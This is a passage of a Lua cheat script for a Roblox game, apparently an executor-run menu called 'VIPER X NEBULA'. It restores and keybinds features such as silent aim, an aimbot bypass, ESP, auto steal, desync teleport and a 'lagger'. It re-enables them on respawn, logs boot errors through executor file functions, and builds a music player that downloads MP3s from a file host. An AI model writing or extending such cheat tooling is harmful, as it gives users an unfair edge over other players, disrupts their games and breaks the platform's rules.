        if setMedusaVisual then setMedusaVisual(false) end
        stopMedusaCounter()
    end

    if batCounterEnabled and setBatCounterVisual then
        setBatCounterVisual(true)
        startBatCounter()
    end
    if batCounterV2Enabled and setBatCounterV2Visual then
        setBatCounterV2Visual(true)
        startBatCounterV2()
    end
    if unwalkEnabled and setUnwalkVisual then
        setUnwalkVisual(true)
        task.spawn(function() task.wait(0.5); startUnwalk() end)
    end
    if antiLagEnabled then
        if setAntiLagVisual then setAntiLagVisual(true) end
        enableAntiLag()
    else
        if setAntiLagVisual then setAntiLagVisual(false) end
        disableAntiLag()
    end
    if espEnabled then
        toggleESP(true)
        if setESPVIsual then setESPVIsual(true) end
    else
        toggleESP(false)
        if setESPVIsual then setESPVIsual(false) end
    end
    if espLineEnabled then
        if setESPLineVisual then setESPLineVisual(true) end
        startESPLine()
    else
        if setESPLineVisual then setESPLineVisual(false) end
        stopESPLine()
    end

    if vividGraphicsEnabled then
        enableVividGraphics()
        if setVividVisual then setVividVisual(true) end
    else
        disableVividGraphics()
        if setVividVisual then setVividVisual(false) end
    end

    if batDesyncTpEnabled then
        if batDesyncTpSetVisual then batDesyncTpSetVisual(true) end
        if not batDesyncTpConn then startBatDesyncTp() end
    else
        if batDesyncTpSetVisual then batDesyncTpSetVisual(false) end
    end

    if stretchEnabled then
        enableStretch()
        if _G.stretchToggleSetter then _G.stretchToggleSetter(true) end
    else
        if _G.stretchToggleSetter then _G.stretchToggleSetter(false) end
    end

    if mobSetAutoBat then mobSetAutoBat(autoBatEnabled) end
    if mobSetAutoLeft then mobSetAutoLeft(autoLeftEnabled) end
    if mobSetAutoRight then mobSetAutoRight(autoRightEnabled) end
    if mobSetCarry then mobSetCarry(speedMode) end
    if mobSetLagger1 then mobSetLagger1(laggerToggled) end
    if mobSetLagger2 then mobSetLagger2(laggerCarryToggled) end

    if bodyLockEnabled and bodyLockSetVisual then
        if _blSuppressCount == 0 then
            bodyLockSetVisual(true)
            startBodyLock()
        else
            bodyLockSetVisual(false)
        end
    end

    if silentAimRangeBox then silentAimRangeBox.Text = tostring(silentAimStudRange or 15) end
    if silentAimEnabled then
        if setSilentAimVisual then setSilentAimVisual(true) end
        startSilentAim()
    else
        if setSilentAimVisual then setSilentAimVisual(false) end
        stopSilentAim()
    end

    if autoMedusaRangeBox then autoMedusaRangeBox.Text = tostring(autoMedusaStudRange or 15) end
    if autoMedusaEnabled then
        if setMedusaAutoVisual then setMedusaAutoVisual(true) end
        startAutoMedusa()
    else
        if setMedusaAutoVisual then setMedusaAutoVisual(false) end
        stopAutoMedusa()
    end

    updateProgressBarVisibility()
    startEnemySpeed()

    toggleLockUI(uiLocked)

    pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
    if outfitSelectorLabel then outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label end
end

-- =====================================================================
-- ARRANQUE BLINDADO
-- =====================================================================
local _bootErrors = {}

function _bootSection(name, fn)
    print("[VIPER X NEBULA Boot] Iniciando:", name)
    local ok, err = pcall(fn)
    if not ok then
        print("[VIPER X NEBULA Boot] FALLÓ:", name, tostring(err))
        table.insert(_bootErrors, {name = name, err = tostring(err)})
        warn("[Y-out Boot] Error en '" .. name .. "': " .. tostring(err))
    else
        print("[VIPER X NEBULA Boot] OK:", name)
    end
    return ok
end

_bootSection("buildGui", function()
    buildGui()
end)

if gui and main then
    _bootSection("loadAllSettings", function()
        if loadAllSettings() then
            updateUIFromLoaded()
        end
    end)
    -- Start periodic persistence only after existing config has had a chance to load.
    _viperAutosaveReady = true

    _bootSection("createMobilePanel", function()
        MobilePanel = createMobilePanel()
    end)
    if type(_G.__VIPER_APPLY_UI_LAYOUT) == "function" then
        _bootSection("applyUILayoutSettings", function()
            _G.__VIPER_APPLY_UI_LAYOUT()
        end)
    end

    if hideButtonsEnabled then
        _bootSection("applyHideButtons", function()
            applyHideButtons(true)
            if setHideButtonsVisual then setHideButtonsVisual(true) end
        end)
    end

    _bootSection("localizeViperInterface", function()
        if gui then localizeViperInterface(gui) end
        if MobilePanel then localizeViperInterface(MobilePanel) end
    end)

    if LP.Character then
        task.spawn(function()
            task.wait(0.1)
            if waitForCharReady(LP.Character, 5) then
                pcall(function() captureOriginalAppearance(LP.Character) end)
                pcall(function() setupMovementAndIndicators(LP.Character) end)
                if currentAnimPack ~= "Off" then
                    pcall(function() startAnimPack(currentAnimPack) end)
                end
                pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
            end
        end)
    end

    if #_bootErrors > 0 then
        task.defer(function()
            pcall(function()
                local env = (getgenv and getgenv()) or _G
                local writeFn = env.writefile or (syn and syn.writefile)
                if type(writeFn) == "function" then
                    local log = "[VIPER Boot Errors] " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
                    for _, e in ipairs(_bootErrors) do
                        log = log .. e.name .. ": " .. e.err .. "\n"
                    end
                    pcall(writeFn, "Viper_boot_errors.txt", log)
                    warn("[VIPER X NEBULA] Errores escritos a Viper_boot_errors.txt")
                end
            end)
        end)

        task.defer(function()
            pcall(function()
                local errGui = Instance.new("ScreenGui")
                errGui.Name = "ViperBootErrors"
                errGui.ResetOnSpawn = false
                errGui.DisplayOrder = 999
                local okCg, cg = pcall(function() return game:GetService("CoreGui") end)
                if okCg and cg then
                    pcall(function() errGui.Parent = cg end)
                end
                if not errGui.Parent then errGui.Parent = LP:WaitForChild("PlayerGui") end

                local frame = Instance.new("Frame", errGui)
                frame.Size = UDim2.new(0, 460, 0, 60 + #_bootErrors * 22)
                frame.Position = UDim2.new(0, 10, 1, -80 - #_bootErrors * 22)
                frame.BackgroundColor3 = Color3.fromRGB(40, 10, 15)
                frame.BorderSizePixel = 0
                Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
                local stroke = Instance.new("UIStroke", frame)
                stroke.Color = Color3.fromRGB(255, 80, 90)
                stroke.Thickness = 1.5

                local title = Instance.new("TextLabel", frame)
                title.Size = UDim2.new(1, -20, 0, 24)
                title.Position = UDim2.new(0, 10, 0, 8)
                title.BackgroundTransparency = 1
                title.Text = "⚠ Y-out: " .. #_bootErrors .. " sección(es) fallaron"
                title.TextColor3 = Color3.fromRGB(255, 100, 110)
                title.Font = Enum.Font.GothamBold
                title.TextSize = 13
                title.TextXAlignment = Enum.TextXAlignment.Left

                for i, e in ipairs(_bootErrors) do
                    local lbl = Instance.new("TextLabel", frame)
                    lbl.Size = UDim2.new(1, -20, 0, 18)
                    lbl.Position = UDim2.new(0, 10, 0, 34 + (i - 1) * 20)
                    lbl.BackgroundTransparency = 1
                    lbl.Text = "• " .. e.name .. ": " .. e.err:sub(1, 110)
                    lbl.TextColor3 = Color3.fromRGB(255, 180, 180)
                    lbl.Font = Enum.Font.Code
                    lbl.TextSize = 10
                    lbl.TextXAlignment = Enum.TextXAlignment.Left
                    lbl.TextTruncate = Enum.TextTruncate.AtEnd
                end

                local copyBtn = Instance.new("TextButton", frame)
                copyBtn.Size = UDim2.new(0, 100, 0, 22)
                copyBtn.Position = UDim2.new(0, 10, 1, -30)
                copyBtn.BackgroundColor3 = Color3.fromRGB(80, 20, 30)
                copyBtn.Text = "COPIAR LOG"
                copyBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
                copyBtn.Font = Enum.Font.GothamBold
                copyBtn.TextSize = 11
                copyBtn.BorderSizePixel = 0
                Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 6)
                copyBtn.MouseButton1Click:Connect(function()
                    local buf = ""
                    for _, e in ipairs(_bootErrors) do
                        buf = buf .. e.name .. ": " .. e.err .. "\n"
                    end
                    pcall(function()
                        if setclipboard then setclipboard(buf) end
                    end)
                    copyBtn.Text = "¡COPIADO!"
                    task.delay(1.2, function() copyBtn.Text = "COPIAR LOG" end)
                end)

                local closeBtn = Instance.new("TextButton", frame)
                closeBtn.Size = UDim2.new(0, 60, 0, 22)
                closeBtn.Position = UDim2.new(1, -70, 1, -30)
                closeBtn.BackgroundColor3 = Color3.fromRGB(80, 20, 30)
                closeBtn.Text = "CERRAR"
                closeBtn.TextColor3 = Color3.fromRGB(255, 200, 200)
                closeBtn.Font = Enum.Font.GothamBold
                closeBtn.TextSize = 11
                closeBtn.BorderSizePixel = 0
                Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
                closeBtn.MouseButton1Click:Connect(function()
                    pcall(function() errGui:Destroy() end)
                end)

                task.delay(60, function()
                    pcall(function() errGui:Destroy() end)
                end)
            end)
        end)
    end
else
    warn("[Y-out Boot] Fatal: buildGui falló. El script no puede continuar.")
end

if LP and LP.CharacterAdded then
    pcall(function()
        local _respawnQueue = 0
        LP.CharacterAdded:Connect(function(char)
            pcall(function()
                _respawnQueue = _respawnQueue + 1
                local myId = _respawnQueue

                if stealConnection then stealConnection:Disconnect(); stealConnection = nil end
                isStealing = false
                if stopAutoLeft then stopAutoLeft() end
                if stopAutoRight then stopAutoRight() end
                if stopBatCounter then stopBatCounter() end
                if stopBatCounterV2 then stopBatCounterV2() end
                if stopMedusaCounter then stopMedusaCounter() end
                if not _tpBatUnwalkForced and stopUnwalk then stopUnwalk() end
                if stopDropBrainrot then stopDropBrainrot() end
                if autoBatEnabled and disableAutoBat then disableAutoBat() end
                if bypassAimbotEnabled and disableBypassAimbot then disableBypassAimbot() end
                if batDesyncTpEnabled and stopBatDesyncTp then stopBatDesyncTp() end
                if bodyLockEnabled and stopBodyLock then stopBodyLock() end

                local deadline = _tick() + 5
                while (not char.Parent) or (not char:FindFirstChild("HumanoidRootPart")) or (not char:FindFirstChildOfClass("Humanoid")) do
                    if _tick() > deadline then return end
                    if myId ~= _respawnQueue then return end
                    task.wait(0.05)
                end

                _hookedVelParts = {}
                local _hrpRespawn = _setupVelChecked(char)
                _hookVelHRP(_hrpRespawn)

                if not _originalAppearance then task.defer(function() captureOriginalAppearance(char) end) end
                if setupMovementAndIndicators then setupMovementAndIndicators(char) end
                if antiRagdollMode == "v2" then startAntiRagdollV2() end
                if antiBatEnabled then startAntiBat() end
                if antiFlingEnabled then startAntiFling() end
                if AntiDieModule.enabled then task.defer(function() activateOnCharacter(char) end) end
                if CONFIG.AUTO_STEAL_ENABLED then pcall(startAutoSteal) end
                if batDesyncTpEnabled then task.defer(startBatDesyncTp) end
                if bodyLockEnabled and _blSuppressCount == 0 then startBodyLock() end

                if medusaCounterEnabled then
                    setupMedusaCounter(char)
                    if setMedusaVisual then setMedusaVisual(true) end
                else
                    stopMedusaCounter()
                    if setMedusaVisual then setMedusaVisual(false) end
                end

                if batCounterEnabled then startBatCounter() end
                if batCounterV2Enabled then startBatCounterV2() end
                if unwalkEnabled and not _tpBatUnwalkForced then startUnwalk() end
                if currentAnimPack ~= "Off" then task.wait(0.3); startAnimPack(currentAnimPack) end

                updateProgressBarVisibility()
                refreshSpeedModeLabel()

                pcall(function() applyOutfitByIndex(currentOutfitIndex) end)
                if outfitSelectorLabel then outfitSelectorLabel.Text = OUTFITS[currentOutfitIndex].label end
            end)
        end)
    end)
end

local lastLaggerToggle = 0
local LAGGER_COOLDOWN = 0.3

UIS.InputBegan:Connect(function(input, gpe)
    if _anyKeyListening then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if gpe or UIS:GetFocusedTextBox() then return end
    elseif not isGamepadInput(input) then
        return
    end
    if not isBindableInput(input) then return end

    local kc = input.KeyCode
    if not kc then return end

        if kbMatch(KB.InstaReset, kc) then
        if _G.VynxDoInstaReset then pcall(_G.VynxDoInstaReset) end
        return
    end
if kbMatch(KB.LaggerMode, kc) then
        if _tick() - lastLaggerToggle >= LAGGER_COOLDOWN then
            lastLaggerToggle = _tick()
            toggleLaggerCycle()
        end
        return
    end
    if kbMatch(KB.CarryToggle, kc) then toggleCarryMode(); return end
    if kbMatch(KB.DropBrainrot, kc) then
        if not dropActive then
            if dropBrainrotSetVisual then dropBrainrotSetVisual(true) end
            executeDropWithToggle(dropBrainrotSetVisual)
        end
        return
    end
    if kbMatch(KB.TPFloor, kc) then doTpDown(); return end
    if kbMatch(KB.AutoLeft, kc) then
        autoLeftEnabled = not autoLeftEnabled
        if autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
        if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
        if mobSetAutoLeft then mobSetAutoLeft(autoLeftEnabled) end
        return
    end
    if kbMatch(KB.AutoRight, kc) then
        autoRightEnabled = not autoRightEnabled
        if autoRightEnabled then startAutoRight() else stopAutoRight() end
        if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
        if mobSetAutoRight then mobSetAutoRight(autoRightEnabled) end
        return
    end
    if kbMatch(KB.AutoBat, kc) then
        if not autoBatEnabled then
            enableAutoBat()
            if autoBatSetVisual then autoBatSetVisual(true) end
            if mobSetAutoBat then mobSetAutoBat(true) end
        else
            disableAutoBat()
            if autoBatSetVisual then autoBatSetVisual(false) end
            if mobSetAutoBat then mobSetAutoBat(false) end
        end
        return
    end
    if kbMatch(KB.BypassAimbot, kc) then toggleBypassAimbot(); return end
    if kbMatch(KB.MirrorTP, kc) then toggleMirrorTPDownV2(); return end
    if kbMatch(KB.DesyncTp, kc) then
        toggleDesyncSpeedMode()
        return
    end
    if kbMatch(KB.GuiHide, kc) then
        if main then
            if main.Visible then hideGui() else showGui() end
        end
        return
    end
end)


local function openMusicPanel()
    local guiParent = getGuiContainer()
    local existingGui = guiParent:FindFirstChild("RestreintMusicPanel")

    if existingGui and existingGui:FindFirstChild("MainFrame") then
        local existingMain = existingGui.MainFrame
        local existingFloat = existingGui:FindFirstChild("FloatBar")
        if not existingMain.Visible and (not existingFloat or not existingFloat.Visible) then
            existingMain.Visible = true
            if existingFloat then existingFloat.Visible = false end
        elseif existingFloat and existingFloat.Visible then
            existingFloat.Visible = false
            existingMain.Visible = true
        end
        _G.ViperSavedMusicPlayerOpen = true
        if saveAllSettings then saveAllSettings() end
        if _G.__RefreshMusicMenuBtn then _G.__RefreshMusicMenuBtn() end
        return
    end

    if existingGui then
        existingGui:Destroy()
    end

    _G.ViperSavedMusicPlayerOpen = true
    if saveAllSettings then saveAllSettings() end
    if _G.__RefreshMusicMenuBtn then _G.__RefreshMusicMenuBtn() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "RestreintMusicPanel"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 9999
    gui.Parent = guiParent

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 320, 0, 348)
    mainFrame.Position = UDim2.new(0.5, -160, 0.5, -174)
    mainFrame.BackgroundColor3 = Color3.fromRGB(12, 10, 20)
    mainFrame.BackgroundTransparency = 0.35 -- Yarı saydam yapılarak arka plan görselinin parlaması sağlandı
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.ZIndex = 2
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = gui

    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 14)
    mainCorner.Parent = mainFrame

    local panelScale = Instance.new("UIScale")
    panelScale.Name = "PanelScale"

    local function clampScale(val)
        local num = tonumber(val) or 1
        return math.clamp(math.floor(num * 20 + 0.5) / 20, 0.5, 2)
    end

    Config.uiScale = clampScale(Config.uiScale)
    panelScale.Scale = Config.uiScale
    panelScale.Parent = mainFrame

    local bgImage = Instance.new("ImageLabel")
    bgImage.Name = "MusicBgImage"
    bgImage.Size = UDim2.new(1, 0, 1, 0)
    bgImage.BackgroundTransparency = 1
    bgImage.Image = Config.backgroundImage
    bgImage.ImageTransparency = 0.05 -- Net ve canlı anime görseli
    bgImage.ScaleType = Enum.ScaleType.Crop
    bgImage.ZIndex = 1
    bgImage.Parent = mainFrame

    local bgCorner = Instance.new("UICorner")
    bgCorner.CornerRadius = UDim.new(0, 14)
    bgCorner.Parent = bgImage

    local mainBorder = Instance.new("UIStroke")
    mainBorder.Thickness = 1.4
    mainBorder.Color = Color3.fromRGB(200, 170, 255)
    mainBorder.Transparency = 0.35
    mainBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    mainBorder.Parent = mainFrame

    local headerBar = Instance.new("Frame")
    headerBar.Name = "HeaderBar"
    headerBar.Size = UDim2.new(1, 0, 0, 38)
    headerBar.BackgroundColor3 = Color3.fromRGB(16, 13, 26)
    headerBar.BackgroundTransparency = 0.45
    headerBar.BorderSizePixel = 0
    headerBar.Active = true
    headerBar.ZIndex = 2
    headerBar.Parent = mainFrame

    local headerCorner = Instance.new("UICorner")
    headerCorner.CornerRadius = UDim.new(0, 14)
    headerCorner.Parent = headerBar

    local accentDot = Instance.new("Frame")
    accentDot.Size = UDim2.new(0, 7, 0, 7)
    accentDot.Position = UDim2.new(0, 14, 0.5, -3)
    accentDot.BackgroundColor3 = Color3.fromRGB(0, 235, 255)
    accentDot.BorderSizePixel = 0
    accentDot.ZIndex = 3
    accentDot.Parent = headerBar

    local dotCorner = Instance.new("UICorner")
    dotCorner.CornerRadius = UDim.new(1, 0)
    dotCorner.Parent = accentDot

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -100, 1, 0)
    titleLabel.Position = UDim2.new(0, 28, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "VIPER X NEBULA MUSIC PLAYER"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.Font = Enum.Font.GothamBlack
    titleLabel.TextSize = 13
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.ZIndex = 3
    titleLabel.Parent = headerBar

    local closeBtn = Instance.new("TextButton")
    closeBtn.Name = "CloseBtn"
    closeBtn.Size = UDim2.new(0, 26, 0, 26)
    closeBtn.Position = UDim2.new(1, -32, 0.5, -13)
    closeBtn.BackgroundColor3 = Color3.fromRGB(48, 22, 42)
    closeBtn.BackgroundTransparency = 0.2
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 14
    closeBtn.AutoButtonColor = true
    closeBtn.ZIndex = 4
    closeBtn.Parent = headerBar

    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 7)
    closeCorner.Parent = closeBtn

    local closeStroke = Instance.new("UIStroke")
    closeStroke.Thickness = 1
    closeStroke.Color = Color3.fromRGB(180, 80, 120)
    closeStroke.Transparency = 0.3
    closeStroke.Parent = closeBtn

    local scalePlusBtn = Instance.new("TextButton")
    scalePlusBtn.Name = "UIScalePlus"
    scalePlusBtn.Size = UDim2.new(0, 24, 0, 24)
    scalePlusBtn.Position = UDim2.new(1, -60, 0.5, -12)
    scalePlusBtn.BackgroundColor3 = Color3.fromRGB(28, 22, 44)
    scalePlusBtn.BackgroundTransparency = 0.2
    scalePlusBtn.Text = "+"
    scalePlusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    scalePlusBtn.Font = Enum.Font.GothamBlack
    scalePlusBtn.TextSize = 14
    scalePlusBtn.AutoButtonColor = false
    scalePlusBtn.ZIndex = 4
    scalePlusBtn.Parent = headerBar

    local scalePlusCorner = Instance.new("UICorner")
    scalePlusCorner.CornerRadius = UDim.new(0, 6)
    scalePlusCorner.Parent = scalePlusBtn

    local scaleMinusBtn = Instance.new("TextButton")
    scaleMinusBtn.Name = "UIScaleMinus"
    scaleMinusBtn.Size = UDim2.new(0, 24, 0, 24)
    scaleMinusBtn.Position = UDim2.new(1, -88, 0.5, -12)
    scaleMinusBtn.BackgroundColor3 = Color3.fromRGB(28, 22, 44)
    scaleMinusBtn.BackgroundTransparency = 0.2
    scaleMinusBtn.Text = "-"
    scaleMinusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    scaleMinusBtn.Font = Enum.Font.GothamBlack
    scaleMinusBtn.TextSize = 15
    scaleMinusBtn.AutoButtonColor = false
    scaleMinusBtn.ZIndex = 4
    scaleMinusBtn.Parent = headerBar

    local scaleMinusCorner = Instance.new("UICorner")
    scaleMinusCorner.CornerRadius = UDim.new(0, 6)
    scaleMinusCorner.Parent = scaleMinusBtn

    local floatScaleRef = nil

    local function adjustUiScale(delta)
        Config.uiScale = clampScale(Config.uiScale + (delta or 0))
        panelScale.Scale = Config.uiScale
        if floatScaleRef then
            floatScaleRef.Scale = Config.uiScale
        end
    end

    scaleMinusBtn.MouseButton1Click:Connect(function() adjustUiScale(-0.05) end)
    scalePlusBtn.MouseButton1Click:Connect(function() adjustUiScale(0.05) end)

    makeDraggable(mainFrame, headerBar)

    local sound = Instance.new("Sound")
    sound.Name = "RestreintMusicSound"
    sound.Volume = 0.6
    sound.Parent = gui

    local function getPlaybackSpeed()
        local num = tonumber(Config.musicSpeed) or 1
        num = math.clamp(num, 0.5, 2)
        return math.floor(num * 10 + 0.5) / 10
    end

    sound.PlaybackSpeed = getPlaybackSpeed()

    local SongList = {
        { name = "vyzee we go up",        url = "https://files.catbox.moe/bvpw7w.mp3", file = "vyzee.mp3" },
        { name = "balenciaga",            url = "https://files.catbox.moe/n6mu6i.mp3", file = "balenciaga.mp3" },
        { name = "du bist",               url = "https://files.catbox.moe/dwjk76.mp3", file = "dubist.mp3" },
        { name = "king nasir",            url = "https://files.catbox.moe/dkci4j.mp3", file = "kingnasir.mp3" },
        { name = "blue bands",            url = "https://files.catbox.moe/3g99za.mp3", file = "bluebands.mp3" },
        { name = "cool for the summer",   url = "https://files.catbox.moe/wymx4d.mp3", file = "coolforthesummer.mp3" },
        { name = "cinderella",            url = "https://files.catbox.moe/uvkpzb.mp3", file = "cinderella.mp3" },
        { name = "ghetto love story",     url = "https://files.catbox.moe/tqunbw.mp3", file = "ghettolovestory.mp3" },
        { name = "track 9",               url = "https://files.catbox.moe/wmnpw2.mp3", file = "track9.mp3" },
        { name = "raya",                  url = "https://files.catbox.moe/uf7506.mp3", file = "raya.mp3" },
        { name = "borro700",              url = "https://files.catbox.moe/095uyy.mp3", file = "borro700.mp3" },
        { name = "borro700 saisai",       url = "https://files.catbox.moe/p15pre.mp3", file = "borro700saisai.mp3" },
        { name = "saisai",                url = "https://files.catbox.moe/xj48yn.mp3", file = "saisai.mp3" },
        { name = "hem",                   url = "https://files.catbox.moe/1p1z83.mp3", file = "hem.mp3" },
    }

    local songAssets = {}
    local loadedSongs = {}

    local function loadSongAudio(songData)
        if songData.soundId then
            songAssets[songData.file] = songData.soundId
            loadedSongs[songData.file] = true
            return true, songData.soundId
        end
        if loadedSongs[songData.file] and songAssets[songData.file] then
            return true, songAssets[songData.file]
        end

        local ok, asset = pcall(function()
            local fileExists = false
            pcall(function()
                if isfile and isfile(songData.file) then
                    fileExists = true
                end
            end)

            if not fileExists then
                local downloaded = game:HttpGet(songData.url)
                if writefile then
                    writefile(songData.file, downloaded)
                end
            end

            if not customAssetLoader then
                error("No custom asset loader (getcustomasset/getsynasset) available")
            end

            local loadedAsset = customAssetLoader(songData.file)
            songAssets[songData.file] = loadedAsset
            loadedSongs[songData.file] = true
            return loadedAsset
        end)

        return ok, asset
    end

    task.spawn(function()
        for _, song in ipairs(SongList) do
            task.spawn(function()
                loadSongAudio(song)
            end)
            task.wait(0.1)
        end
    end)

    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Name = "SongScrollList"
    scrollFrame.Size = UDim2.new(1, -20, 0, 180)
    scrollFrame.Position = UDim2.new(0, 10, 0, 46)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 3
    scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(200, 160, 255)
    scrollFrame.ScrollBarImageTransparency = 0.3
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #SongList * 40 + 6)
    scrollFrame.ClipsDescendants = true
    scrollFrame.ZIndex = 2
    scrollFrame.Parent = mainFrame

    local currentPlayingFile = nil
    local currentPlayToken = 0
    local lastSelectedSong = nil
    local lastSelectedIndex = nil
    local syncStateFn = nil

    local function highlightSong(activeIdx)
        for i = 1, #SongList do
            local btn = scrollFrame:FindFirstChild("MusicBtn" .. i)
            if btn then
                if i == activeIdx then
                    btn.BackgroundColor3 = Color3.fromRGB(70, 30, 115)
                    btn.BackgroundTransparency = 0.35 -- Seçili şarkı vurgulanır
                    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
                else
                    btn.BackgroundColor3 = Color3.fromRGB(20, 14, 34)
                    btn.BackgroundTransparency = 0.72 -- Arka plan resminin görünmesi için şeffaf cam efekti
                    btn.TextColor3 = Color3.fromRGB(230, 220, 245)
                end
                if btn:GetAttribute("OrigName") then
                    btn.Text = btn:GetAttribute("OrigName")
                end
            end
        end
    end

    local function playSongTrack(songData, buttonInstance, songIndex)
        lastSelectedSong = songData
        lastSelectedIndex = songIndex

        if currentPlayingFile == songData.file and sound.IsPlaying then
            currentPlayToken = currentPlayToken + 1
            pcall(function() sound:Stop() end)
            currentPlayingFile = nil
            highlightSong(nil)
            if syncStateFn then syncStateFn(false) end
            return
        end

        currentPlayToken = currentPlayToken + 1
        local thisToken = currentPlayToken

        if songData.soundId then
            pcall(function() sound:Stop() end)
            sound.SoundId = songData.soundId
            sound.PlaybackSpeed = getPlaybackSpeed()
            sound:Play()
            currentPlayingFile = songData.file
            highlightSong(songIndex)
            if syncStateFn then syncStateFn(true) end
            return
        end

        if loadedSongs[songData.file] and songAssets[songData.file] then
            pcall(function() sound:Stop() end)
            sound.SoundId = songAssets[songData.file]
            sound.PlaybackSpeed = getPlaybackSpeed()
            sound:Play()
            currentPlayingFile = songData.file
            highlightSong(songIndex)
            if syncStateFn then syncStateFn(true) end
            return
        end

        if buttonInstance then
            buttonInstance.Text = "Loading..."
        end

        task.spawn(function()
            local success, assetId = loadSongAudio(songData)
            if thisToken ~= currentPlayToken then return end

            if success and assetId then
                pcall(function() sound:Stop() end)
                sound.SoundId = assetId
                sound.PlaybackSpeed = getPlaybackSpeed()
                sound:Play()
                currentPlayingFile = songData.file
                highlightSong(songIndex)
                if syncStateFn then syncStateFn(true) end
            elseif buttonInstance then
                buttonInstance.Text = "Failed"
                task.wait(1.2)
                if thisToken == currentPlayToken and buttonInstance:GetAttribute("OrigName") then
                    buttonInstance.Text = buttonInstance:GetAttribute("OrigName")
                end
            end
        end)
    end

    for i, song in ipairs(SongList) do
        local songBtn = Instance.new("TextButton")
        songBtn.Name = "MusicBtn" .. i
        songBtn.Size = UDim2.new(1, -6, 0, 34)
        songBtn.Position = UDim2.new(0, 3, 0, 3 + (i - 1) * 38)
        songBtn.Text = song.name
        songBtn:SetAttribute("OrigName", song.name)
        songBtn.BackgroundColor3 = Color3.fromRGB(20, 14, 34)
        songBtn.BackgroundTransparency = 0.72 -- Arka plandaki anime kızı net görünsün
        songBtn.TextColor3 = Color3.fromRGB(235, 225, 250)
        songBtn.Font = Enum.Font.GothamBold
        songBtn.TextSize = 11
        songBtn.AutoButtonColor = true
        songBtn.ZIndex = 3
        songBtn.Parent = scrollFrame

        local songBtnCorner = Instance.new("UICorner")
        songBtnCorner.CornerRadius = UDim.new(0, 8)
        songBtnCorner.Parent = songBtn

        local songBtnStroke = Instance.new("UIStroke")
        songBtnStroke.Thickness = 1
        songBtnStroke.Color = Color3.fromRGB(110, 70, 140)
        songBtnStroke.Transparency = 0.45
        songBtnStroke.Parent = songBtn

        songBtn.MouseButton1Click:Connect(function()
            playSongTrack(song, songBtn, i)
        end)
    end

    sound.Ended:Connect(function()
        highlightSong(nil)
        currentPlayingFile = nil
        if syncStateFn then syncStateFn(false) end
    end)

    local speedRow = Instance.new("Frame")
    speedRow.Name = "SpeedRow"
    speedRow.Size = UDim2.new(1, -20, 0, 36)
    speedRow.Position = UDim2.new(0, 10, 0, 236)
    speedRow.BackgroundColor3 = Color3.fromRGB(20, 16, 32)
    speedRow.BackgroundTransparency = 0.6 -- Yarı saydam
    speedRow.BorderSizePixel = 0
    speedRow.ZIndex = 2
    speedRow.Parent = mainFrame

    local speedCorner = Instance.new("UICorner")
    speedCorner.CornerRadius = UDim.new(0, 8)
    speedCorner.Parent = speedRow

    local speedTitle = Instance.new("TextLabel")
    speedTitle.Size = UDim2.new(0, 52, 1, 0)
    speedTitle.Position = UDim2.new(0, 10, 0, 0)
    speedTitle.BackgroundTransparency = 1
    speedTitle.Text = "SPEED"
    speedTitle.TextColor3 = Color3.fromRGB(210, 210, 230)
    speedTitle.Font = Enum.Font.GothamBlack
    speedTitle.TextSize = 9
    speedTitle.TextXAlignment = Enum.TextXAlignment.Left
    speedTitle.ZIndex = 3
    speedTitle.Parent = speedRow

    local spdMinusBtn = Instance.new("TextButton")
    spdMinusBtn.Name = "SpdMinus"
    spdMinusBtn.Size = UDim2.new(0, 26, 0, 26)
    spdMinusBtn.Position = UDim2.new(0, 58, 0.5, -13)
    spdMinusBtn.BackgroundColor3 = Color3.fromRGB(28, 22, 44)
    spdMinusBtn.BackgroundTransparency = 0.3
    spdMinusBtn.Text = "-"
    spdMinusBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    spdMinusBtn.Font = Enum.Font.GothamBlack
    spdMinusBtn.TextSize = 15
    spdMinusBtn.AutoButtonColor = false
    spdMinusBtn.ZIndex = 3
    spdMinusBtn.Parent = speedRow

    local spdMinusCorner = Instance.new("UICorner")
    spdMinusCorner.CornerRadius = UDim.new(0, 7)
    spdMinusCorner.Parent = spdMinusBtn

    local spdValLabel = Instance.new("TextLabel")
    spdValLabel.Name = "SpdVal"
    spdValLabel.Size = UDim2.new(1, -150, 0, 20)
    spdValLabel.Position = UDim2.new(0, 90, 0.5, -10)
    spdValLabel.BackgroundTransparency = 1
    spdValLabel.Text = "100%"
    spdValLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
